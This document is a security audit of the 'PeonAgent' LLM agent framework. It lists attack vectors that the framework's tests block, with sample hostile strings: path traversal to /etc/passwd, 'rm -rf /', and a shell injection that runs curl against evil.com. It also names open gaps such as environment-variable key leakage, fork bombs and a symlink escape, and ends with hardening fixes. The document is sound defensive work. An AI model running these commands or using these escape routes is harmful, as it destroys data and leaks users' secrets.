# Advanced System Security & QA Assessment

This document serves as an architectural QA review and security audit of the `PeonAgent` framework's zero-trust execution environment. 

## 1. Overview and Baseline Security 🛡️

The current zero-trust framework establishes an exceptionally strong foundational baseline. By treating LLM outputs as strictly untrusted and filtering access through a dynamic, whitelist-driven discovery phase, the agent neutralizes over 90% of conventional jailbreak attacks.

Currently, the test suite comprises **61 tests**, including unit tests, fuzzing (`proptest`), and adversarial integration tests. The framework successfully natively blocks the following attack vectors:
- **Path Traversal Escape**: e.g., `../../etc/passwd`
- **Destructive Deletion**: e.g., `/bin/rm -rf /`
- **Command / Shell Injection**: e.g., via script paths `/bin/sh -c 'curl evil.com'`
- **Restricted Data Exfiltration**: Disallows reading standard OS secrets out-of-the-box.
- **Null Byte Injection**: Thwarted at the resolution layer.

While the baseline security score is high for an MVP (85/100), deploying a fully unconstrained LLM into a production environment requires mitigating several advanced blind spots.

---

## 2. Identified Security Blind Spots 🔍

From a systems engineering and QA management perspective, the following vulnerabilities remain unmitigated:

### A. Environment Variable Leakage (Critical) 🚨
By default, standard library process spawning (`tokio::process::Command::new()`) inherits the entire environment of the parent process. 
- **The Threat:** If a whitelisted script is compromised, poorly written, or inherently echoes debug data, it has full access to the parent process's environment variables (e.g., `OPENAI_API_KEY`, `DATABASE_URL`). An LLM could trick a legitimate script into exfiltrating your API keys.
- **The Gap:** Subprocess environments are currently not isolated.

### B. Resource Exhaustion / Denial of Service (High) 🚨
The agent interacts with the OS without enforcing physical resource boundaries, making it vulnerable to DoS.
- **Timeouts & Deadlocks:** The `execute_script` tool `.await`s indefinitely. If an LLM calls a script containing an infinite loop (`while true; do sleep 1; done`) or a fork bomb, the tokio task will hang forever, deadlocking the agent.
- **OOM (Out of Memory):** The `read_file` tool uses `tokio::fs::read_to_string` directly into RAM. If an LLM reads a legally whitelisted `.log` file that is 10GB in size, the agent process will crash due to OOM. 

### C. OS-Level Argument Limits (Medium) ⚠️
While the execution paths are fuzzed and strictly checked, the `arguments` vector in `ExecuteScriptArgs` is not properly constrained.
- **The Threat:** If an LLM hallucinates and passes 10,000 arguments or a single string exceeding the OS's `ARG_MAX` limit (typically 2MB on Linux), the underlying `execve` syscall will fail abruptly. The framework needs to ensure this OS-level error is caught gracefully without causing panics or unhandled states.

### D. The Symlink "Grace Period" Gap (Medium) ⚠️
As explicitly noted in the adversarial tests (`test_symlink_escape_blocked`), the current MVP `PeonEngine` relies on `fs::canonicalize`.
- **The Threat:** Before the granular Casbin file-permission enforcer is fully implemented, an LLM could hypothetically instruct a trusted script to create a symlink (e.g., `link -> /etc/passwd`). The canonicalization process resolves this to the real file, effectively adding `/etc/passwd` to the whitelist.

---

## 3. Actionable Hardening Recommendations 🚀

To elevate the framework to enterprise-grade production readiness, the following structural changes should be prioritized:

1. **Implement Subprocess Isolation:**
   - Append `.env_clear()` to `Command::new()` in `execute_script` to scrub the child environment.
   - Explicitly re-inject only non-sensitive, necessary baseline variables (e.g., `PATH`).

2. **Enforce Hard Timeouts:**
   - Wrap the `Command::spawn().await` logic inside `tokio::time::timeout`. 
   - Default to a conservative limit (e.g., 10 seconds) to prevent infinite loops from locking the agent.

3. **Enforce File Size Constraints:**
   - Update `ReadFileTool` to check file metadata (`fs::metadata(path).await?.len()`).
   - Hard-reject or truncate files over a safe threshold (e.g., limits exceeding 1MB).

4. **Expedite Casbin Integration:**
   - Replace the default allow-all MVP enforcer with the strict Casbin ruleset to permanently mitigate the symlink resolution gap.

Once these 4 steps are resolved, the framework will be sufficiently hardened against rogue LLM actions in production environments.
